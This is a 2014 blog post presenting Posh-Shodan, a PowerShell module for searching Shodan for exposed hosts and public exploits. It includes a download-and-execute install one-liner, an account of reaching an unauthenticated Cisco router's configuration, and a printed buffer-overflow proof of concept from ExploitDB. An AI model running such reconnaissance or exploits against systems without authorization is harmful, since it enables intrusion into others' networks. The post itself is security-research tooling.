---
title: Posh-Shodan module for the Shodan service
author: Carlos Perez
type: post
date: 2014-07-15T16:05:09+00:00
url: /2014/07/15/posh-shodan-module-for-the-shodan-service/
categories:
  - infosec
  - security
  - Modules
  - PoshShodan
tags:
  - infosec
  - security
  - Modules
  - PoshShodan

---
### What is Shodan?

Shodan is a search engine that lets one find hosts on the internet using a variety of filters. The search engine is constantly scanning and updating its database providing the user with an ability to discover all kinds of hosts (routers, computers, access points, printers, etc.) connected to the public internet. Specifying filters like banners, port numbers, geo locations and others, Shodan becomes a very important tool for admins of a large web presence, pentesters, researchers, and auditors.

### Why I Wrote the Module

In my day-to-day job researching vulnerabilities, their impact and identifying what is out there is of great importance. Also in my side work of writing security tools being able to know real world data in terms of exposure and to be able to measure, parse and quantify the data becomes even more important and PowerShell is one of the best tools out there to help me through my workflow of finding and filtering information.

### Requirement for Use

The free service itself provides access only to a subset of the information. To be able to get access to all features one needs to use their API. Before installing the module it should be clear that the API access to the service is a paid one with different levels of amount of data one can access in a month and the level of support. When one purchases the REST API access, the access is provided through an API key that is used with all requests. At this moment there are 3 pricing schemes to choose from:

  * Freelancer: $19/ month
  * Small Business: $99/ month
  * Enterprise: $499/ month

Each of them provides increased levels of access, from 1 million results/month for Freelancer up to completely unlimited access to the REST API at the Enterprise plan. One can purchase an API key at https://developer.shodan.io/

### Installing the Module

Before installing a module, make sure you are running PowerShell 3.0 or later since the module is using features introduced in PowerShell 3.0. The module is currently hosted on <a href="https://github.com/darkoperator/Posh-Shodan" title="Posh-Shodan module on GitHub" target="_blank">GitHub</a> and can be installed directly from it by invoking the command shown in the project page.

<pre class="brush: powershell; title: ; notranslate" title="">iex (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/darkoperator/9378450/raw/7244d3db5c0234549a018faa41fc0a2af4f9592d/PoshShodanInstall.ps1")
</pre>

The installation process will download the latest version of the master branch, unlock the .zip file, decompress and install files in the user’s profile module path. After the installation is finished it will load the module for you and show the commands available.

```
PS> iex (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/darkoperator/9378450/raw/7244d3db5c0234549a018faa41fc0a2af4f9592d/PoshShodanInstall.ps1")

Downloading latest version of Posh-Shodan from https://github.com/darkoperator/Posh-Shodan/archive/master.zip. File saved to C:\Users\Carlos\AppData\Local\Temp\Posh-Shodan.zip

Uncompressing the Zip file to C:\Users\Carlos\Documents\WindowsPowerShell\Modules
Renaming folder
Module has been installed
CommandType     Name                                               ModuleName
-----------     ----                                               ----------
Function        Get-ShodanAPIInfo                                  Posh-Shodan
Function        Get-ShodanDNSResolve                               Posh-Shodan
Function        Get-ShodanDNSReverse                               Posh-Shodan
Function        Get-ShodanHostServices                             Posh-Shodan
Function        Get-ShodanMyIP                                     Posh-Shodan
Function        Get-ShodanServices                                 Posh-Shodan
Function        Measure-ShodanExploit                              Posh-Shodan
Function        Measure-ShodanHost                                 Posh-Shodan
Function        Read-ShodanAPIKey                                  Posh-Shodan
Function        Search-ShodanExploit                               Posh-Shodan
Function        Search-ShodanHost                                  Posh-Shodan
Function        Set-ShodanAPIKey                                   Posh-Shodan
```

If you are running PowerShell 5.0 (Community Tech Preview (CTP) is available at the time this article is written) you can use the PowerShellGet module to install the module. We can search for it using the Find-Module cmdlet.

```
PS> Find-Module posh-shodan | fl

Name            : Posh-Shodan
Version         : 1.0
Description     : Module for interacting with the Shodan service at http://www.shodanhq.com/ given a developer API key.
Author          : Carlos Perez &lt;carlos_perez@darkoperator.com
CompanyName     :
Copyright       : (c) 2014 Carlos Perez &lt;carlos_perez@darkoperator.com. All rights reserved.
LicenseUri      :
ProjectUri      :
IconUri         :
Tag             : {Shodan}
ReleaseNotes    :
DateUpdated     : 7/4/2014 7:15:45 AM
RequiredModules :
DownloadUri     : https://msconfiggallery.cloudapp.net/api/v2/package/Posh-Shodan/1.0.0
Hash            : ogCPvmkGiczS3vR93p+4la+gxzfacHHd3CqMsJCyDaKWl1LCqMCk0+pSrGN9Ua9zH8NQyhRNLYzfnJB6aKRYzg==
HashAlgorithm   : SHA512
SourceUri       : https://go.microsoft.com/fwlink/?LinkID=397631&clcid=0x409
SourceType      : PSGallery
```

You will be able to see the version and update information. To install you can just run the Install-Module cmdlet from a PowerShell session running as administrator.

<pre class="brush: powershell; title: ; notranslate" title="">PS C:\&gt; Install-Module -Name posh-shodan -Verbose
</pre>
### Initial Setup

After installation, if you have an API key from Shodan you can start using the module immediately specifying the API key in all commands when performing the query. Another method is to save the key encrypted with a master password so that we don’t have to look for the key every time when it’s needed. To save our key we use the command Set-ShodanAPIKey to set the API key and encrypt it to disk with the master password:

<pre class="brush: powershell; title: ; notranslate" title="">PS C:\&gt; Set-ShodanAPIKey -APIKey 238784665352425277288393 -MasterPassword (Read-Host -AsSecureString)
</pre>

The key is now saved in a secure manner on disk and set as the key for use for all other commands. The key is saved in an encrypted file in your APPDATA directory.

```
PS> ls $env:APPDATA\Posh-Shodan
    Directory: C:\Users\Carlos\AppData\Roaming\Posh-Shodan

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          3/4/2014  11:20 AM        194 api.key
```

For loading a stored key after opening a new session just issue the command to read the key with you master password. You need to specify the password as a secure string to provide the necessary protections to it when it’s stored in memory. This is why it is a bad practice to use a password as a string in your advanced functions or cmdlets.

<pre class="brush: powershell; title: ; notranslate" title="">Read-ShodanAPIKey -MasterPassword (Read-Host -AsSecureString)
</pre>

Once the key is loaded into memory we can see information on our specific key using the Get-ShodanAPIInfo command.

```
PS> Get-ShodanAPIInfo
Unlocked_Left : 97
Telnet        : True
Plan          : dev
HTTPS         : True
Unlocked      : True 
```

We can also see a list of services Shodan recognizes and are available for search with Get-ShodanService command:

```
PS> Get-ShodanService

623   : IPMI
9151  : Tor control port
9200  : ElasticSearch
5985  : WinRM 2.0 HTTP
32764 : Router backdoor
9100  : Printer Job Language
7071  : Zimbra HTTP
9999  : Telnet (Lantronix)
1911  : Tridium Fox
137   : NetBIOS
110   : POP3
11211 : MemCache
8443  : HTTPS (8443)
3306  : MySQL
9051  : Tor control port
80    : HTTP
81    : HTTP (81)
119   : NNTP
1900  : UPnP
5060  : SIP
2323  : Telnet (2323)
25    : SMTP
47808 : BACnet
5353  : mDNS
21    : FTP
22    : SSH
23    : Telnet
9160  : Cassandra
5560  : Oracle HTTP
3790  : Metasploit HTTPS
44818 : EtherNetIP
3389  : RDP
7777  : Oracle HTTP (7777)
465   : SMTP (465)
5900  : VNC
8089  : Splunk HTTPS
502   : Modbus
995   : POP3 + SSL
5432  : PostgreSQL
5001  : Synology
5000  : Synology
771   : RealPort
143   : IMAP
993   : IMAP + SSL
992   : Telnet + SSL
443   : HTTPS
2628  : Dictionary
9943  : Pipeline Pilot (HTTPS)
1434  : MS-SQL Monitor
445   : SMB
8333  : Bitcoin
123   : NTP
8129  : Snapstream
20000 : DNP3
102   : Siemens S7
389   : LDAP
6000  : X Windows
8000  : Qconn
161   : SNMP
79    : Finger
9981  : HTS/ tvheadend
11    : Systat
13    : Daytime
15    : Netstat
1023  : Telnet (1023)
17    : Quote of the day
5632  : PC Anywhere
27017 : MongoDB
5986  : WinRM 2.0 HTTPS
1723  : PPTP
53    : DNS
4911  : Tridium Fox + SSL
6379  : Redis
1471  : Hak5 Pineapple
9944  : Pipeline Pilot (HTTP)
8834  : Nessus HTTPS
8080  : HTTP (8080)
28017 : MongoDB HTTP
2067  : DLSW 
```

### Searching Hosts with Shodan

The power of Shodan comes from its ability of searching for hosts with a rich set of filters. The list of filters is so big, so a few conceptual help topics exist to help you understand them better.

```
PS> help about_shodan | fl

Name          : about_Shodan_Host_Search_Facets
Category      : HelpFile
Synopsis      : Describes the search facets that can be used when performing a search for
Component     : 
Role          : 
Functionality : 
Length        : 3054

Name          : about_Shodan_Host_Search_Filters
Category      : HelpFile
Synopsis      : Describes the search filters that can be used when performing a search for
Component     : 
Role          : 
Functionality : 
Length        : 2633
```

 The command we would use to perform the searches is Search-ShodanHost. We have to be careful since&#8211;depending on what subscription we paid for&#8211;we have a limited numbers of searches we can perform with the credits we have. To avoid consuming all available searches we may choose to use the Measure-ShodanHost command has the same options as the Search-ShodanHost command but it does not consumes credits and returns the total count of results it found. If your search returns more than 100 results it counts against the amount of searches you are allowed to make. By using the Measure-ShodanHost command you can check if one will be consumed or not.

The facet option and its filters allow us to group information depending on the filter given. The use of the facets comes in handy when quantifying or trying to detect a pattern in the results. More on the options can be seen in the contextual help about\_Shodan\_host\_Search\_Facets. For both Search-ShodanHost and Measure-ShodanHost facet names can be in the format of &#8220;property:count&#8221;, where &#8220;count&#8221; is the number of facets that will be returned for a property (i.e. &#8220;country:100&#8221; to get the top 100 countries for a search query).

Let’s see what kind of results I can get by searching for Cisco devices that do not require authentication; I will use a friend’s IP range for the company he runs (I did got permission to use it as an example and vulnerability has been closed and info anonymized):

```
PS> Measure-ShodanHost -Query "cisco-ios last-modified"  -Net "192.168.1.1/24" -City "San Juan"
Total  : 1
Facets : 
```

Seems we found one result for the specified network range. Let’s perform the actual search.

```
PS> Search-ShodanHost -Query "cisco-ios last-modified" -Net "192.168.1.1/24" -City "San Juan"
Total            Matches                                  Facets          
-----            -------                                  ------
1                {@{product=Cisco IOS http config; os=...          
```

Let’s save the results to a variable and look at what matched.

```
PS> $res = Measure-ShodanHost -Query "cisco-ios last-modified" -Net "192.168.1.1/24" -City "San Juan"
PS> $res.matches | select -First 1 
product   : Cisco IOS http config
os        : 
title     : 
timestamp : 2014-07-12T04:56:33.323593
isp       : AT&T
cpe       : o:cisco:ios
asn       : AS3141
hostnames : {}
location  : @{city=San Juan …}
ip        :12345
domains   : {}
org       : My Friends Org
data      : HTTP/1.0 200 OK
            Date: Sat, 20 Mar 1993 15:42:45 GMT
            Server: cisco-IOS
            Connection: close
            Transfer-Encoding: chunked
            Content-Type: text/html
            Expires: Sat, 20 Mar 1993 15:42:45 GMT
            Last-Modified: Sat, 20 Mar 1993 15:42:45 GMT
            Cache-Control: no-store, no-cache, must-revalidate
            Accept-Ranges: none
                        
port      : 443
ip_str    : 192.168.1.1 
```

If we want to see more information about the host (e.g. open ports), we can use the Get-ShodanHostService command and give it the IP address. If we connect to the device we can see it is vulnerable and after doing the command “show run” I could see it controlled OSPF and BGP routes for the organization putting me in a position to disrupt or intercept traffic.

![](/images/Shodan1.png)

### Searching for Exploits

Shodan also allows us to search for publicly known exploits filtering by:

  * BID ID (Bugtraq ID) from http://www.securityfocus.com/vulnerabilities
  * CVE ID (Common Vulnerabilities and Exposure) from https://cve.mitre.org/
  * OSVDB ID (Open Source Vulnerability Database) from http://osvdb.org/
  * Microsoft Bulletin
  * Type (Remote, Local, DOS)
  * Port
  * Platform

Just like searching for hosts we have a command to measure how many results we will get that does not count against the amount of searches we can perform. Let’s look for exploits against RDP on Windows.

```
PS> $RDPExploits = Search-ShodanExploit -Query RDP -Platform windows
PS> $RDPExploits
Total            Matches                                  Facets          
-----            -------                                  ------
10               {@{code=source: http://www.securityfo...                 

PS> $RDPExploits.matches | group -Property type
Count Name                      Group
----- ----                      -----
4 dos                       {@{code=source: http://www.securityfocus.com/bid/3445/info...             
2 exploit                   {@{code=##...                            
3 local                     {@{code=#!/usr/bin/perl...                                            
1 remote                    {@{code=2X Client for RDP 10.1.1204 ClientSystem Class ActiveX Control ...
```

When you look at one of the matches you will see it will include the source code for the exploit if it’s available in addition to other metadata.

```
PS> $RDPExploits.matches[2]
code        : # exploit.py
              ##########################################################
              # Cain & Abel v4.9.23 (rdp file) Buffer Overflow PoC
              # (other versions may also affected)
              # By:Encrypt3d.M!nd
              #    encrypt3d.blogspot.com
			 #
              # Greetz:-=Mizo=-,L!0N,El Mariachi,MiNi SpIder

			 ##########################################################
			 #
              # Description:
              # When Using Remote Desktop Password Decoder in Cain and
              # Importing ".rdp" file contains long Chars(ex:8250 chars)
              # The Program Will crash.And The Following Happen:
			 #
              # EAX:41414141  ECX:7C832648  EDX:41414142  EBX:00000000
              # ESP:0012BCD4  EBP:0012BCD4  ESI:001F07A8  EDI:00000001
              # EIP:7E43C201 USER32.7E43C201
			 #
              # Access violation When Reading [41414141]
			 #
              # And Also The Pointer to next SEH record and SE Handler
              # Will gonna BE Over-wrote
			 #
              # This Poc Will Gonna Overwrite the Pointer to next SEH
              # With"42424242" and The SE Handler with"43434343"
			 #
			 ##########################################################
			 chars = "A"*8194
			 ptns = "B"*4
			 shan = "C"*4
			 chars2 = "A"*200
              exp=open('cain.rdp','w')
              exp.write(chars+ptns+shan+chars2)
              exp.close()

              # milw0rm.com [2008-11-30]
description : Cain & Abel 4.9.23 (rdp file) Buffer Overflow PoC
author      : Encrypt3d.M!nd 
_id         : 7297
source      : ExploitDB
platform    : windows
date        : 2008-11-30T00:00:00+00:00
cve         : {2008-5405}
type        : dos
port        : 0 
```

The module should prove useful for security professionals in both red and blue team activities.